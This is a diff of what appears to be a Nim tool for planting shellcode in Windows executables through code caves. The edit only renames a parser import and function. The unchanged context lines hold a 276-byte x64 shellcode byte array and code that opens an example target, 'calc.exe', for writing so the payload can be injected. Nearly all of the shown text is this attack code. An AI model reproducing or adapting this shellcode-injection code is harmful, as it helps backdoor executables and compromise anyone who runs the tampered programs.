@@ -1,4 +1,4 @@
-import ptr_math, winim, cligen, ../../General/PeParsing/Parser, ../../General/MemoryScanning/CodeCaves
+import ptr_math, winim, cligen, ../../General/PeFileParsing/Parser, ../../General/MemoryScanning/CodeCaves
 
 var shellcode: array[276, byte] = [
 byte 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
@@ -18,7 +18,7 @@ byte 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x4
 
 var shellcodeSize = sizeof(shellcode)
 var targetPe = "calc.exe" # example
-var peFile = parsePe(targetPe)
+var peFile = parsePeFile(targetPe)
 
 var hPe: HANDLE = CreateFileA(targetPe, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))
 
